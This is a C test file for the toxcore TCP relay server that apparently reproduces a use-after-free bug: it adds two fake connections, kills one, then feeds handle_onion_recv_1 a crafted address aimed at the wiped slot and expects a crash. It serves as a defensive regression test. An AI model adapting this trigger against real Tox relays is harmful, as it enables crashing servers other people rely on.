#include "../toxcore/TCP_server.h"
#include "../toxcore/TCP_client.h"
#include "../toxcore/onion.h"
#include "../toxcore/network.h"
#include "../toxcore/ccompat.h"
#include "auto_test_support.h"
#include "../testing/misc_tools.h"
#include "../toxcore/os_random.h"
#include "../toxcore/os_memory.h"
#include "../toxcore/crypto_core.h"
#include "../toxcore/mono_time.h"

#include "../toxcore/TCP_server_impl.h"


static void test_onion_recv_1_uaf(void)
{
    const Random *rng = os_random();
    const Network *ns = os_network();
    const Memory *mem = os_memory();
    Mono_Time *mono_time = mono_time_new(mem, NULL, NULL);
    Logger *logger = logger_new(mem);

    uint8_t self_public_key[CRYPTO_PUBLIC_KEY_SIZE];
    uint8_t self_secret_key[CRYPTO_SECRET_KEY_SIZE];
    crypto_new_keypair(rng, self_public_key, self_secret_key);

    uint16_t port = 33445;
    TCP_Server *tcp_s = new_tcp_server(logger, mem, rng, ns, true, 1, &port, self_secret_key, NULL, NULL);
    ck_assert_msg(tcp_s != NULL, "Failed to create a TCP relay server.");

    // Manually create and add two fake connections to the server's accepted list.
    // This ensures size_accepted_connections > 0 and accepted_connection_array is allocated.
    // We need at least two so that when we kill one, the array is not freed.
    TCP_Secure_Connection *conn1 = (TCP_Secure_Connection *)calloc(1, sizeof(TCP_Secure_Connection));
    conn1->status = TCP_STATUS_CONFIRMED;
    uint8_t conn1_secret_key[CRYPTO_SECRET_KEY_SIZE];
    crypto_new_keypair(rng, conn1->public_key, conn1_secret_key);
    int conn1_id = add_accepted(tcp_s, mono_time, conn1);
    ck_assert(conn1_id != -1);

    TCP_Secure_Connection *conn2 = (TCP_Secure_Connection *)calloc(1, sizeof(TCP_Secure_Connection));
    conn2->status = TCP_STATUS_CONFIRMED;
    uint8_t conn2_secret_key[CRYPTO_SECRET_KEY_SIZE];
    crypto_new_keypair(rng, conn2->public_key, conn2_secret_key);
    int conn2_id = add_accepted(tcp_s, mono_time, conn2);
    ck_assert(conn2_id != -1);

    // Now, kill the first connection. This will wipe its data (including the identifier)
    // but will not shrink the accepted_connection_array.
    kill_accepted(tcp_s, conn1_id);

    // Craft a malicious IP_Port structure that targets the wiped connection slot.
    IP_Port malicious_dest;
    ipport_reset(&malicious_dest);
    malicious_dest.ip.family = net_family_tcp_client();
    malicious_dest.ip.ip.v6.uint32[0] = conn1_id; // Target the killed connection's ID
    malicious_dest.ip.ip.v6.uint64[1] = 0;        // Use identifier 0, as the struct is now wiped

    uint8_t dummy_data[] = "exploit";
    uint16_t dummy_length = sizeof(dummy_data);

    // This call will now trigger the use-after-free.
    // ip_port_to_con_id will return true because the identifier check (0 == 0) passes.
    // handle_onion_recv_1 will then use a pointer to the wiped (freed) connection struct,
    // leading to a null pointer dereference inside write_packet_tcp_secure_connection.
    // This should cause a crash (segmentation fault).
    handle_onion_recv_1(tcp_s, &malicious_dest, dummy_data, dummy_length);

#ifdef EXPECT_CRASH
    // If the program hasn't crashed by now, the vulnerability is not triggered as expected.
    ck_assert_msg(false, "The application did not crash as expected.");
#endif

    kill_tcp_server(tcp_s);
    logger_kill(logger);
    mono_time_free(mem, mono_time);
    free(conn1);
    free(conn2);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    test_onion_recv_1_uaf();
    return 0;
}
